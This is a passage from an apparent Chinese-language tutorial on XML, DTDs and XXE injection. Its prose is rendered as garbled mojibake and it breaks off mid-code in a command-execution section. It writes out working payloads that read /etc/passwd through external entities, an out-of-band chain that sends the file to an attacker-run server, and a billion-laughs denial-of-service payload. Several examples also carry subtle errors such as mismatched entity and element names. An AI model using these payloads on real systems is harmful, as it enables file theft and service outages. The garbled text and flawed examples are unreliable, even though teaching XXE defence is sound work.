æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå¾ˆç±»ä¼¼ HTML<br>XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®<br>XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾<br>XML è¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§<br>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†</p><p>ä¸HTMLçš„å¯¹æ¯”<br>XML ä¸æ˜¯ HTML çš„æ›¿ä»£<br>XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡<br>XML è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹<br>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚<br>HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯</p><h2 id="XMLæ–‡æ¡£ç»“æ„"><a href="#XMLæ–‡æ¡£ç»“æ„" class="headerlink" title="XMLæ–‡æ¡£ç»“æ„"></a>XMLæ–‡æ¡£ç»“æ„</h2><p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p>è¯·çœ‹ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XMLç”³æ˜--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;wecome&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;to&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;This wave is hacker&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;You are a good hacker&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><h2 id="DTDï¼š"><a href="#DTDï¼š" class="headerlink" title="DTDï¼š"></a>DTDï¼š</h2><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼ˆå†…éƒ¨å¼•ç”¨ï¼‰ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚<br>DTDæ–‡æ¡£ä¸­æœ‰å¾ˆå¤šé‡è¦çš„å…³é”®å­—å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">o DOCTYPEï¼ˆDTDçš„å£°æ˜ï¼‰</span><br><span class="line"></span><br><span class="line">o ENTITYï¼ˆå®ä½“çš„å£°æ˜ï¼‰</span><br><span class="line"></span><br><span class="line">o SYSTEMã€PUBLICï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨å¦‚ä¸‹è¯­æ³•å¼•å…¥å¤–éƒ¨DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨å¦‚ä¸‹è¯­æ³•å¼•ç”¨å†…éƒ¨DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</span><br></pre></td></tr></table></figure><h2 id="å®ä½“ï¼š"><a href="#å®ä½“ï¼š" class="headerlink" title="å®ä½“ï¼š"></a>å®ä½“ï¼š</h2><p>å®ä½“å¯ä»¥ç†è§£ä¸ºå˜é‡ï¼Œå…¶å¿…é¡»åœ¨DTDä¸­å®šä¹‰ç”³æ˜ï¼Œå¯ä»¥åœ¨æ–‡æ¡£ä¸­çš„å…¶ä»–ä½ç½®å¼•ç”¨è¯¥å˜é‡çš„å€¼ã€‚</p><p>å®ä½“æŒ‰ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å››ç§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">o å†…ç½®å®ä½“ (Built-in entities)</span><br><span class="line"></span><br><span class="line">o å­—ç¬¦å®ä½“ (Character entities)</span><br><span class="line"></span><br><span class="line">o é€šç”¨å®ä½“ (General entities)</span><br><span class="line"></span><br><span class="line">o å‚æ•°å®ä½“ (Parameter entities)</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¦‚æœå®ä½“æ ¹æ®å¼•ç”¨æ–¹å¼ï¼Œè¿˜å¯åˆ†ä¸ºå†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“ã€‚<br>å®Œæ•´çš„å®ä½“ç±»åˆ«å¯å‚è€ƒ DTD - Entities</p><h2 id="å››ç§å®ä½“å¼•ç”¨å®ä¾‹"><a href="#å››ç§å®ä½“å¼•ç”¨å®ä¾‹" class="headerlink" title="å››ç§å®ä½“å¼•ç”¨å®ä¾‹"></a>å››ç§å®ä½“å¼•ç”¨å®ä¾‹</h2><h4 id="å†…éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br><span class="line">&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°å®ä½“å¤–å®ä½“-å†…éƒ¨å®ä½“"><a href="#å‚æ•°å®ä½“å¤–å®ä½“-å†…éƒ¨å®ä½“" class="headerlink" title="å‚æ•°å®ä½“å¤–å®ä½“+å†…éƒ¨å®ä½“"></a>å‚æ•°å®ä½“å¤–å®ä½“+å†…éƒ¨å®ä½“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°å®ä½“-å¤–éƒ¨å®ä½“"><a href="#å‚æ•°å®ä½“-å¤–éƒ¨å®ä½“" class="headerlink" title="å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“"></a>å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h6 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;nameï¼ˆå…¶ä½™å®ä½“ï¼‰æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚<br>ç”±äºxxeæ¼æ´ä¸»è¦æ˜¯åˆ©ç”¨äº†DTDå¼•ç”¨å¤–éƒ¨å®ä½“å¯¼è‡´çš„æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç‰¹åˆ«æ¥åˆ†æå¤–éƒ¨å®ä½“</p><h3 id="å¤–éƒ¨å®ä½“"><a href="#å¤–éƒ¨å®ä½“" class="headerlink" title="å¤–éƒ¨å®ä½“"></a>å¤–éƒ¨å®ä½“</h3><p>å®šä¹‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡urlå¯ä»¥å¼•ç”¨å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“ï¼Ÿå½“ç„¶ä¸åŒçš„ç¨‹åºè¯­è¨€ï¼Œæ‰€æ”¯æŒçš„åè®®æ˜¯ä¸ä¸€æ ·çš„</p><p>å¯¹ç…§è¡¨ï¼š</p><p>æ¡ˆä¾‹æ¼”ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE A [</span><br><span class="line">    &lt;!ENTITY Config SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;Config;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äºŒé˜¶æ®µï¼ˆæµ…è°ˆxxeæ¼æ´"><a href="#ç¬¬äºŒé˜¶æ®µï¼ˆæµ…è°ˆxxeæ¼æ´" class="headerlink" title="ç¬¬äºŒé˜¶æ®µï¼ˆæµ…è°ˆxxeæ¼æ´)"></a>ç¬¬äºŒé˜¶æ®µï¼ˆæµ…è°ˆxxeæ¼æ´)</h1><h2 id="XXEæ¼æ´ä»‹ç»ï¼š"><a href="#XXEæ¼æ´ä»‹ç»ï¼š" class="headerlink" title="XXEæ¼æ´ä»‹ç»ï¼š"></a>XXEæ¼æ´ä»‹ç»ï¼š</h2><p>XXEæ¼æ´å…¨ç§°XML External Entity Injectionå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ã€‚xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚æ­¤ç±»æ”»å‡»å¯èƒ½åŒ…æ‹¬ä½¿ç”¨fileï¼šæ–¹æ¡ˆæˆ–ç³»ç»Ÿæ ‡è¯†ç¬¦ä¸­çš„æœ¬åœ°è·¯å¾„å…¬å¼€æœ¬åœ°æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç æˆ–ç§äººç”¨æˆ·æ•°æ®ã€‚ç”±äºæ­¤ç±»æ”»å‡»æ˜¯ç›¸å¯¹äºå¤„ç†XMLæ–‡æ¡£çš„åº”ç”¨ç¨‹åºè€Œå‘ç”Ÿçš„ï¼Œå› æ­¤æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨æ­¤å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºè½¬åˆ°å…¶ä»–å†…éƒ¨ç³»ç»Ÿï¼Œå¯èƒ½é€šè¿‡http(s)è¯·æ±‚å…¬å¼€å…¶ä»–å†…éƒ¨å†…å®¹æˆ–å¯åŠ¨CSRFæ”»å‡»ä»»ä½•ä¸å—ä¿æŠ¤çš„å†…éƒ¨æœåŠ¡ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡å–æ¶ˆå¼•ç”¨æ¶æ„URIæ¥åˆ©ç”¨å®¹æ˜“å—åˆ°å®¢æˆ·ç«¯å†…å­˜æŸåé—®é¢˜å½±å“çš„XMLå¤„ç†å™¨åº“ï¼Œä»è€Œå¯èƒ½å…è®¸åœ¨åº”ç”¨ç¨‹åºå¸æˆ·ä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚å…¶ä»–æ”»å‡»å¯ä»¥è®¿é—®å¯èƒ½ä¸ä¼šåœæ­¢è¿”å›æ•°æ®çš„æœ¬åœ°èµ„æºï¼Œå¦‚æœæœªé‡Šæ”¾å¤ªå¤šçº¿ç¨‹æˆ–è¿›ç¨‹ï¼Œä¹Ÿå¯èƒ½ä¼šå½±å“åº”ç”¨ç¨‹åºçš„å¯ç”¨æ€§ã€‚</p><h6 id="æ³¨æ„ï¼š-1"><a href="#æ³¨æ„ï¼š-1" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>è¯¥åº”ç”¨ç¨‹åºæ— éœ€æ˜¾å¼å°†å“åº”è¿”å›ç»™æ”»å‡»è€…ï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“å—åˆ°ä¿¡æ¯æ³„éœ²çš„å½±å“ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨DNSä¿¡æ¯é€šè¿‡å­åŸŸåå°†æ•°æ®æ³„æ¼åˆ°ä»–ä»¬æ§åˆ¶çš„DNSæœåŠ¡å™¨ã€‚</p><h1 id="ç¬¬ä¸‰é˜¶æ®µï¼ˆå‘ç°xxeæ¼æ´ï¼‰"><a href="#ç¬¬ä¸‰é˜¶æ®µï¼ˆå‘ç°xxeæ¼æ´ï¼‰" class="headerlink" title="ç¬¬ä¸‰é˜¶æ®µï¼ˆå‘ç°xxeæ¼æ´ï¼‰"></a>ç¬¬ä¸‰é˜¶æ®µï¼ˆå‘ç°xxeæ¼æ´ï¼‰</h1><h2 id="é€šè¿‡æäº¤POSTè¯·æ±‚XMLæ–‡ä»¶ï¼š"><a href="#é€šè¿‡æäº¤POSTè¯·æ±‚XMLæ–‡ä»¶ï¼š" class="headerlink" title="é€šè¿‡æäº¤POSTè¯·æ±‚XMLæ–‡ä»¶ï¼š"></a>é€šè¿‡æäº¤POSTè¯·æ±‚XMLæ–‡ä»¶ï¼š</h2><h6 id="æ³¨æ„ï¼š-2"><a href="#æ³¨æ„ï¼š-2" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>æäº¤ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯·æ±‚å¤´åŠ ä¸ŠContent-type:application/xml</p><p>ç¬¬ä¸€æ­¥ï¼ŒéªŒè¯XMLè§£æå™¨æ˜¯å¦è§£æå’Œæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„XMLå†…å®¹</p><p>å‘é€payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY name &quot;hacker&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…æˆåŠŸè§£æäº†xmlæ–‡æ¡£<br>å°†è¿”å›å†…å®¹ä¸ºhacker</p><p>ç¬¬äºŒæ­¥ï¼Œæ˜¯å¦æ”¯æŒå¤–éƒ¨å®ä½“çš„å¼•ç”¨ã€‚</p><p>åˆ©ç”¨æ­¥éª¤ï¼š</p><ol><li>è‡ªå»ºwebç½‘ç«™</li><li>åœ¨æµ‹è¯•ç½‘ç«™æäº¤payload</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY dtgmlf6ent SYSTEM &quot;http:&#x2F;&#x2F;è‡ªå·±ç½‘ç«™ip&#x2F;æ–‡ä»¶å&quot;&gt;]&gt;  </span><br><span class="line">&lt;GeneralSearch&gt;&amp;test;&lt;&#x2F;GeneralSearch&gt;</span><br></pre></td></tr></table></figure><ol><li>æŸ¥çœ‹ç½‘ç«™è¿”å›å†…å®¹ä¸­æ˜¯å¦å¸¦æœ‰è‡ªå»ºç½‘ç«™æ–‡ä»¶ä¸­çš„å†…å®¹</li><li>æŸ¥çœ‹è‡ªå»ºæœåŠ¡å™¨è®¿é—®æ—¥å¿—ï¼Œæ˜¯å¦æœ‰DTDæ–‡ä»¶ç­‰è¯·æ±‚</li></ol><h1 id="ç¬¬å››é˜¶æ®µï¼ˆxxeæ¼æ´åˆ©ç”¨ï¼‰"><a href="#ç¬¬å››é˜¶æ®µï¼ˆxxeæ¼æ´åˆ©ç”¨ï¼‰" class="headerlink" title="ç¬¬å››é˜¶æ®µï¼ˆxxeæ¼æ´åˆ©ç”¨ï¼‰"></a>ç¬¬å››é˜¶æ®µï¼ˆxxeæ¼æ´åˆ©ç”¨ï¼‰</h1><h2 id="1-ä»»æ„æ–‡ä»¶è¯»å–ï¼š"><a href="#1-ä»»æ„æ–‡ä»¶è¯»å–ï¼š" class="headerlink" title="1. ä»»æ„æ–‡ä»¶è¯»å–ï¼š"></a>1. ä»»æ„æ–‡ä»¶è¯»å–ï¼š</h2><p>Payloadï¼ˆæœ‰å›æ˜¾ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡å¤–å¸¦ï¼ˆOOBï¼‰çš„æ–¹æ³•æ¥æ£€æµ‹ï¼ˆæ— å›æ˜¾ï¼‰</p><p>â‘ è‡ªå»ºwebæœåŠ¡å™¨<br>â‘¡åˆ›å»ºæ¥å—æ•°æ®çš„æ–‡ä»¶readdata.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;passwd.txt&quot;, $_GET[&#39;file&#39;]) ;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>â‘¢åˆ›å»ºhacker.phpæ¥ä¾›å¤–éƒ¨å®ä½“å¼•ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml&#x3D;&lt;&lt;&lt;EOF  </span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  &#x2F;&#x2F;è¢«æ”»å‡»çš„æœåŠ¡å™¨</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;hacker.xml&quot;&gt;  &#x2F;&#x2F;è‡ªå»ºæœåŠ¡å™¨</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;  </span><br><span class="line">]&gt;  </span><br><span class="line">EOF;  </span><br><span class="line">$data &#x3D; simplexml_load_string($xml) ;  </span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;  </span><br><span class="line">print_r($data) ;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>â‘£åˆ›å»ºhacker.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;localhost&#x2F;readdata.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>å½“è®¿é—®<a href="http://localhost/hacker.php">http://localhost/hacker.php</a>, å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä¼šè¯»å‡º/etc/passwdå†…å®¹ï¼Œå‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨ä¸Šçš„hacker.phpï¼Œç„¶åæŠŠè¯»å–çš„æ•°æ®ä¿å­˜åˆ°æœ¬åœ°çš„passwd.txtä¸­ã€‚</p><h2 id="2-DOSæ”»å‡»ï¼š"><a href="#2-DOSæ”»å‡»ï¼š" class="headerlink" title="2. DOSæ”»å‡»ï¼š"></a>2. DOSæ”»å‡»ï¼š</h2><p>è‘—åçš„â€œbillion laughsâ€å°±æ˜¯åˆ©ç”¨äº†XXE<br>é€šè¿‡é€’å½’è°ƒç”¨<br>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><h2 id="3-å‘½ä»¤æ‰§è¡Œ"><a href="#3-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="3. å‘½ä»¤æ‰§è¡Œ"></a>3. å‘½ä»¤æ‰§è¡Œ</h2><p>phpå®‰è£…expectæ‰©å±•å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 